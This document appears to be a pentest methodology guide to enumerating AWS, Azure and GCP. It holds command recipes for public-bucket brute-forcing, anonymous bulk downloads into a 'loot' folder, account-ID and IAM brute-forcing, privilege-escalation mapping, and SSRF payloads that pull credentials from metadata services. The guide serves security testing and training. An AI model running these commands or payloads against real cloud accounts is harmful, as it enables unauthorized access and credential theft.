# Cloud Enumeration (AWS, Azure, GCP)

Cloud recon is fundamentally different from traditional network recon: the attack surface isn't servers and firewalls — it's **IAM policies, storage permissions, and trust relationships** between services. The two phases are **unauthenticated/external** (find public buckets, exposed snapshots, the account ID, leaked keys — all from outside) and **authenticated** (once you hold credentials: enumerate IAM, find over-permissioned identities, map privilege-escalation paths). This doc focuses on AWS (the deepest coverage) with parallel Azure/GCP sections.

```
EXTERNAL (no creds)                AUTHENTICATED (have creds)
  ├─ identify provider (DNS/IP)      ├─ whoami (sts get-caller-identity)
  ├─ public buckets / blobs / GCS    ├─ IAM users/roles/policies enum
  ├─ public AMIs / snapshots         ├─ permission brute (enumerate-iam)
  ├─ account-ID discovery            ├─ privesc path analysis (pmapper)
  └─ leaked keys (OSINT)             └─ posture audit (Prowler/ScoutSuite)
        │                                      │
        └──────────── SSRF → IMDS steals creds ┘  (bridge external→authenticated)
```

> **The SSRF→IMDS bridge:** an SSRF in a target's web app pointed at the instance metadata service (`169.254.169.254`) frequently yields temporary cloud credentials — turning external recon into authenticated access. IMDSv2 (token-required) mitigates this; many instances still allow IMDSv1.

---

## Identify the Cloud Provider

```bash
# Name servers reveal the DNS provider
dig +short NS target.io
#   awsdns-*           → Route53 (AWS)
#   *.azure-dns.*      → Azure DNS
#   ns-cloud-*.googledomains.com → Google Cloud DNS
#   *.cloudflare.com   → Cloudflare (proxying something behind it)

# Reverse-DNS / IP ownership
host www.target.io && host 52.70.117.69
whois 52.70.117.69 | grep -Ei 'OrgName|NetName'
#   ec2-*.compute-1.amazonaws.com → EC2 (region in hostname)
#   *.cloudapp.azure.com / *.azurewebsites.net → Azure
#   *.bc.googleusercontent.com → GCP

# DevTools / response headers leak service domains
#   s3.amazonaws.com, *.amazonaws.com         → AWS
#   *.blob.core.windows.net, azurewebsites.net→ Azure
#   storage.googleapis.com, appspot.com       → GCP
```

> Cloud-hosted targets usually have **no dedicated ASN** — skip ASN recon (see `passive/whois-and-dns.md`) and pivot to cert SANs, service domains, and bucket enumeration.

---

## Multi-Cloud Public-Resource Sweep (Unauthenticated)

`cloud_enum` is the one-shot tool: it brute-forces public buckets, blobs, and GCS objects across all three clouds from a keyword.

```bash
# Single keyword
cloud_enum -k targetcorp

# Multiple keywords + a custom mutations file (env/region variants)
cloud_enum -k targetcorp -k target.com -k target-prod -m mutations.txt

# Scope to one cloud
cloud_enum -k targetcorp --disable-azure --disable-gcp     # AWS only
```

Build a smart keyword/mutation list — `target-assets`, `target-prod`, `target-dev`, `target-backups`, region/env suffixes. Naming conventions are predictable; mutations are where the hits come from.

---

## AWS — S3 Bucket Enumeration

```bash
# Triage a bucket's existence/access via HTTP status
curl -sI "https://BUCKET.s3.amazonaws.com/"
#   200 + XML listing → OPEN (listable)
#   403 AccessDenied  → exists, protected (still try GetObject on guessed keys)
#   404 NoSuchBucket  → does not exist

# Pull bucket names referenced in the site's HTML/JS
curl -s https://www.target.io | grep -oP '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com' | sort -u
curl -s https://www.target.io | grep -oP '(?<=//)[a-z0-9.-]+(?=\.s3\.amazonaws\.com)' | sort -u

# Dedicated scanners
s3scanner scan -b BUCKET                                   # tests read/write/perms
s3scanner scan -f buckets.txt
# AWS CLI (anonymous): list + download
aws s3 ls s3://BUCKET --no-sign-request
aws s3 cp s3://BUCKET/secret.txt . --no-sign-request
aws s3 sync s3://BUCKET ./loot --no-sign-request           # bulk download if open
```

> Always test **write** access too (`s3scanner` does this) — a world-writable bucket serving site assets is often XSS/defacement, sometimes RCE if it backs a deploy pipeline. `--no-sign-request` performs anonymous access without credentials.

### Discover the AWS Account ID (no creds needed)

The 12-digit account ID enables role/user enumeration. Two unauthenticated methods:

```bash
# A) Public AMIs/snapshots filtered by org name → OwnerId is the account ID (needs YOUR creds, reads target's PUBLIC resources)
aws --profile attacker ec2 describe-images --executable-users all \
  --filters "Name=name,Values=*Target*" --query 'Images[].OwnerId' --output text
aws --profile attacker ec2 describe-snapshots \
  --filters "Name=description,Values=*target*" --query 'Snapshots[].OwnerId' --output text

# B) From an access key you've found (leaked key → account ID, offline)
#    AWS access key IDs encode the account; decode without any API call:
#    (tools: aws_account_id from an AKIA..., or sts get-access-key-info)
aws --profile attacker sts get-access-key-info --access-key-id AKIA...   # returns Account

# C) Brute the account ID digit-by-digit via an S3 ResourceAccount condition policy
#    Attach a policy to a low-priv user restricting s3 to accounts matching "1*", "12*", ...
#    and test access to a known public bucket; the matching prefix reveals each digit.
```

---

## AWS — Cross-Account Identity Enumeration (Unauthenticated)

Probe whether a specific IAM user/role *exists* in the target account using your own resources' policies — no creds for the target required.

```bash
# Role enumeration via an AssumeRole trust policy:
#   build a role in YOUR account whose trust policy names arn:aws:iam::TARGET:role/NAME
#   "MalformedPolicyDocument: Invalid principal" = role does NOT exist
#   no error = role EXISTS
# Pacu automates both user and role enumeration:
pacu
> import_keys attacker
> run iam__enum_roles  --word-list roles.txt --account-id 123456789012
> run iam__enum_users  --word-list users.txt --account-id 123456789012
```

Use common role names (`admin`, `OrganizationAccountAccessRole`, `*-deploy`, `*-lambda-role`, `terraform`) and the org's naming convention.

---

## AWS — Authenticated IAM Reconnaissance

Once you hold credentials (leaked, SSRF/IMDS, or assumed), enumerate identity and permissions.

```bash
# 1) WHOAMI — always first
aws --profile target sts get-caller-identity                # UserId, Account, Arn

# 2) Full IAM snapshot (preferred single call)
aws --profile target iam get-account-authorization-details \
  --filter User Group Role LocalManagedPolicy AWSManagedPolicy > iam_dump.json
aws --profile target iam get-account-summary

# 3) Per-identity detail
aws --profile target iam list-attached-user-policies --user-name USER
aws --profile target iam list-groups-for-user --user-name USER
aws --profile target iam get-policy-version --policy-arn ARN --version-id v3

# 4) Brute your OWN effective permissions (you rarely have iam:List perms)
enumerate-iam --access-key AKIA... --secret-key ...         # probes hundreds of read APIs
pacu  > run iam__bruteforce_permissions                     # noisy but thorough
```

### Privilege-Escalation Indicators (what to hunt in `iam_dump.json`)

- `Action: "*"` + `Resource: "*"` (admin equivalent).
- Dangerous singletons: `iam:CreateAccessKey`, `iam:UpdateLoginProfile`, `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:AddUserToGroup`, `iam:CreatePolicyVersion`, `iam:PassRole` + `lambda:CreateFunction`/`ec2:RunInstances`, `sts:AssumeRole` into a privileged role.
- No MFA on privileged users; over-broad ABAC tag conditions.

```bash
# pmapper builds an IAM graph and finds privesc paths automatically
pmapper --profile target graph create
pmapper --profile target query 'preset privesc *'
```

---

## AWS — Posture Auditing (Authenticated, Broad)

```bash
prowler aws -p target                                       # CIS/best-practice checks, hundreds of findings
scout suite aws --profile target                            # multi-service HTML report
pacu  > run aws__enum_account ; run ec2__enum ; run s3__enum   # targeted module runs
```

---

## Azure Enumeration

Azure pivots on **tenant**, **Entra ID (Azure AD)**, and **storage accounts/blobs**.

```bash
# Tenant / federation recon (unauthenticated)
#   getuserrealm / openid config reveal tenant id, federation, brand
curl -s "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" | jq '.issuer,.authorization_endpoint'
#   AADInternals (PowerShell): tenant info, user enumeration, validate emails
#   Invoke-AADIntReconAsOutsider -DomainName target.com

# Public blob storage (unauthenticated)
curl -sI "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
#   MicroBurst / BlobHunter brute storage accounts + containers + public blobs
#   Invoke-EnumerateAzureBlobs -Base targetcorp
blobhunter -s SUBSCRIPTION_ID                               # scan a subscription's blobs (authed)

# Authenticated enumeration
az login
az account show ; az ad signed-in-user show
az resource list -o table                                   # everything you can see
az storage account list ; az role assignment list --all
#   ScoutSuite / Stormspotter for graphing Entra ID + resource relationships
scout suite azure --cli
```

Azure-specific surface: `*.azurewebsites.net` (App Service), `*.blob.core.windows.net` (storage), `*.database.windows.net` (SQL), managed identities (SSRF→IMDS at `169.254.169.254/metadata/identity` with `Metadata: true` header).

---

## GCP Enumeration

GCP pivots on **projects**, **service accounts**, and **GCS buckets**.

```bash
# Public GCS buckets (unauthenticated)
curl -sI "https://storage.googleapis.com/BUCKET"
gsutil ls -r gs://BUCKET                                    # list if public
GCPBucketBrute -k targetcorp -u                             # brute bucket names (unauth check)

# Authenticated enumeration
gcloud auth login
gcloud config list ; gcloud projects list
gcloud projects get-iam-policy PROJECT_ID                   # who can do what
gcloud iam service-accounts list --project PROJECT_ID
gcloud compute instances list ; gcloud storage buckets list
#   ScoutSuite for GCP posture
scout suite gcp --user-account
```

GCP-specific: `appspot.com` (App Engine), `cloudfunctions.net`, `run.app` (Cloud Run), service-account key JSON leaks (high value — long-lived creds), metadata at `169.254.169.254/computeMetadata/v1/` (`Metadata-Flavor: Google` header).

---

## SSRF → Instance Metadata (Steal Credentials)

If you find SSRF in a target's web app, point it at the metadata endpoint to grab temporary cloud creds.

```text
# AWS (IMDSv1 — no token):
http://169.254.169.254/latest/meta-data/iam/security-credentials/        # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE    # AccessKeyId/SecretAccessKey/Token
# IMDSv2 requires a PUT for a token first (harder via SSRF):
#   PUT http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)

# Azure (header required):
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/   (Metadata: true)

# GCP (header required):
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token   (Metadata-Flavor: Google)
```

Stolen creds → plug into the authenticated enumeration above (`aws sts get-caller-identity`, etc.).

---

## Cheatsheet

```bash
cloud_enum -k targetcorp -m mutations.txt                       # multi-cloud public sweep
curl -sI https://BUCKET.s3.amazonaws.com/                       # S3 existence/access
s3scanner scan -b BUCKET                                        # S3 read/write/perms
aws sts get-caller-identity --profile target                   # whoami (always first)
aws iam get-account-authorization-details --profile target     # full IAM snapshot
enumerate-iam --access-key AKIA... --secret-key ...            # brute own perms
pmapper --profile target query 'preset privesc *'             # AWS privesc paths
az resource list -o table                                      # Azure: what can I see
gsutil ls -r gs://BUCKET                                        # GCS public listing
prowler aws -p target                                          # posture audit
```

---

## OPSEC & Pitfalls

- **External recon is quiet; authenticated APIs are logged** — CloudTrail/Azure Activity/GCP Audit log every call. `iam__bruteforce_permissions` and `enumerate-iam` are *very* noisy.
- **`--no-sign-request` / anonymous** access to public buckets is unauthenticated and low-noise; prefer it for discovery.
- **Cloud targets have no useful ASN** — don't waste time on ASN recon.
- **IMDSv2** blocks most SSRF→creds; always *try* IMDSv1 paths but expect token requirements.
- **Test write on buckets**, not just read — write access is often higher severity.
- **Scope is strict in cloud bug bounty** — AWS/Azure/GCP have their own testing rules; brute-forcing account IDs / cross-account probing can violate program terms. Confirm authorization.
- **Never use leaked keys** beyond confirming validity unless explicitly authorized; report and recommend rotation.

---

## References

- HackTricks Cloud — Pentesting Cloud Methodology — https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology
- cloud_enum — https://github.com/initstring/cloud_enum
- S3Scanner — https://github.com/sa7mon/S3Scanner
- Pacu — https://github.com/RhinoSecurityLabs/pacu
- enumerate-iam — https://github.com/andresriancho/enumerate-iam
- PMapper — https://github.com/nccgroup/PMapper
- Prowler — https://github.com/prowler-cloud/prowler
- ScoutSuite — https://github.com/nccgroup/ScoutSuite
- MicroBurst (Azure) — https://github.com/NetSPI/MicroBurst  |  AADInternals — https://github.com/Gerenios/AADInternals
- BlobHunter — https://github.com/cyberark/blobhunter
- GCPBucketBrute — https://github.com/RhinoSecurityLabs/GCPBucketBrute
- Best Cloud Pentesting Tools 2025 — https://deepstrike.io/blog/best-tools-for-cloud-penetration-testing-in-2025
- Pentest Book — Cloud (GCP/AWS/Azure) — https://six2dez.gitbook.io/pentest-book/enumeration/cloud
</content>
</invoke>
